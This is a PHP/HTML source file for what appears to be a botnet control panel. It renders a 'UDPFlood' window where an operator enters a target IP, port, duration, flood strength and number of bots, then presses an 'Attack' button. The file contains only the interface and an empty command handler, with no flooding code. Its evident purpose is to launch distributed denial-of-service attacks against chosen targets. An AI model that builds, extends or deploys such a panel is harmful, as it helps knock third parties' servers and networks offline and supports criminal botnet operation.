<?php
	if(isset($_GET['command'])) {
		switch(strtolower($_GET['command']))
		{
			case "":
				// Lolwut		
				break;
			default:						
		}
	} else {
?>
	<form action="index.php?p=UIWindowUDPFlood" method="get" onsubmit="return processUDPFlood(this)">
		Target <input id="UDPFlood_TargetIP" name="TargetIP" type="text" style="position:absolute;right:4px" /><br /><br />
		Port <input id="UDPFlood_TargetPort" name="TargetPort" size="6" value="0" type="text" style="position:absolute;right:4px;text-align:right;" /><br /><br />
		Duration (m) <input id="UDPFlood_Duration"  size="6" value="60" name="Duration" type="text" style="position:absolute;right:4px;text-align:right;" /><br /><br />
		Strength <input id="UDPFlood_Strength" size="6" name="Strength" value="0%" type="text" style="position:absolute;right:4px;text-align:right;" />
		<div id="UDPFlood_Strength_Slider" onclick="udpfloodstrength_Slider(event)" onmousemove="udpfloodstrength_SliderMove(event)" onmouseleave="udpfloodstrength_SliderEnd(event)" onmouseup="udpfloodstrength_SliderEnd(event)" onmousedown="udpfloodstrength_SliderBegin(event)" class="precipitationBGGray" style="float:right;position:relative;right:60px;/*top:-14px;left:75px;*/width:100px;"><div id="UDPFlood_Strength_InnerSlider" class="curPrecipitation" style="width:1%;"></div></div>
		<br /><br />
		Bots<input id="UDPFlood_Bots" size="6" name="Bots" type="text" value="0" style="position:absolute;right:4px;text-align:right;" />
		<div id="UDPFlood_Bots_Slider" onclick="udpfloodbots_Slider(event)" onmousemove="udpfloodbots_SliderMove(event)" onmouseleave="udpfloodbots_SliderEnd(event)" onmouseup="udpfloodbots_SliderEnd(event)" onmousedown="udpfloodbots_SliderBegin(event)" class="precipitationBGGray" style="float:right;position:relative;right:60px;/*top:-14px;left:75px;*/width:100px;"><div id="UDPFlood_Bots_InnerSlider" class="curPrecipitation" style="width:1%;"></div></div>
		<br /><br />
		<input id="cancelAttack" name="cancel" value="Cancel" type="button" style="position:absolute;right:25%;" onclick="hideWindow('udpflood')" /> <input id="submitAttack" name="submit" value="Attack" type="submit" style="position:absolute;left:25%;" />
	</form>

<?php
	}
?>